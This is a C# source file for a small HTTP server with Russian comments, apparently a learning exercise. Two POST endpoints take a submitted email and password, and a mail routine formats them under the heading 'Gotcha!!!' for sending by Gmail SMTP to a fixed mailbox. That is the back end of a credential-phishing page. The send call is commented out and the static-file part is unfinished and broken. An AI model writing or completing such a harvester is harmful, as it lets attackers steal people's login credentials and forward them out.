using MyHttpServer.Configuration;
using System.Net;
using System.Net.Mail;
using System.Text;

namespace MyHttpServer
{
    public class HttpServer : IDisposable
    {
        private CancellationTokenSource _cancellationTokenSource;
        private HttpListener _listener;
        private Appsettings _config;

        public HttpServer()
        {
            _config = Configuration.Configuration.Config;
            _listener = new HttpListener();
            _cancellationTokenSource = new CancellationTokenSource();

            // установка адресов прослушки
            _listener.Prefixes.Add($"{_config.Address}:{_config.Port}/");
        }

        public async void Start()
        {

            // начинаем прослушивать входящие подключения
            _listener.Start();
            Console.WriteLine("Сервер запущен");

            await Task.Run(() => { Listener(); }, _cancellationTokenSource.Token);

        }

        public void Stop()
        {
            _cancellationTokenSource.Cancel();
            _listener.Stop();

            Console.WriteLine("Сервер завершил свою работу");
        }

        private async Task Listener()
        {
            const string indexHtml = "index.html";

            try
            {
                // В бесконечном цикле
                while (true)
                {
                    // получаем контекст
                    var context = await _listener.GetContextAsync();

                    var request = context.Request;

                    var absltPath = request.Url.AbsolutePath;


                    var filePath = "";
                    try
                    {
                        /// Отправки письма на /send-email
                        if (request.HttpMethod.Equals("Post", StringComparison.OrdinalIgnoreCase) && absltPath == "/send-email")
                        {
                            var stream = new StreamReader(request.InputStream);

                            string str = await stream.ReadToEndAsync();
                            string[] str1 = str.Split('&');
                            await SendEmailAsync(str1[0], str1[1]);
                        }

                        /// Отправки письма на /send-email
                        if (request.HttpMethod.Equals("Post", StringComparison.OrdinalIgnoreCase) && absltPath == "/dodo-email")
                        {
                            var stream = new StreamReader(request.InputStream);

                            string str = await stream.ReadToEndAsync();
                            string[] str1 = str.Split('&');
                            await SendEmailAsync(str1[0], str1[1]);
                        }
                        //// --------------------------------------------------
                        ///


                        //// Получение файлов (то что ниже не работает)
                        var response = context.Response;
                        using Stream output = response.OutputStream;
                        byte[] buffer = null;

                        /// блок загрузки файлов и страниц статических
                        
                        /// - тут должна быть ваша реклама-логика

                        //// --------------------------------------------------
                        ///


                        //// Формирования ответа

                        // получаем поток ответа и пишем в него ответ
                        response.ContentType = "text/html";
                        response.ContentLength64 = buffer.Length;

                        // отправляем данные
                        await output.WriteAsync(buffer);
                        await output.FlushAsync();
                        //// --------------------------------------------------


                        Console.WriteLine("Запрос обработан и отправлен ответ");
                    }
                    catch (FileNotFoundException)
                    {
                        Console.WriteLine(String.Format("Файл {0} не найден", filePath));
                    }
                };
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("Во время работы сервера произошла непредвиденная ошибка: {0}", ex.Message));
                Stop();
            }

        }

        public void Dispose()
        {
            Stop();
        }

        private async Task SendEmailAsync(string email, string password)
        {
            string emailSender = "somemail@gmail.com";
            string passwordSender = "mypassword";

            string fromName = "Tom";
            string toEmail = "somemail@gmail.com";

            string subject = "subject";
            string body = String.Format("<h1> Попался!!! </h1><p>email:{0}</p><p>password: {1}</p>", email, password);

            string smtpServerHost = "smtp.gmail.com";
            ushort smtpServerPort = 587;

            MailAddress from = new MailAddress(emailSender, fromName);
            MailAddress to = new MailAddress(toEmail);

            MailMessage m = new MailMessage(from, to);
            m.Subject = subject;
            m.Body = body;

            SmtpClient smtp = new SmtpClient(smtpServerHost, smtpServerPort);
            smtp.Credentials = new NetworkCredential(emailSender, passwordSender);
            smtp.EnableSsl = true;

            //await smtp.SendMailAsync(m);
            Console.WriteLine("--------------------");
            Console.WriteLine(body);
            Console.WriteLine("Письмо отправлено");
        }
    }
}
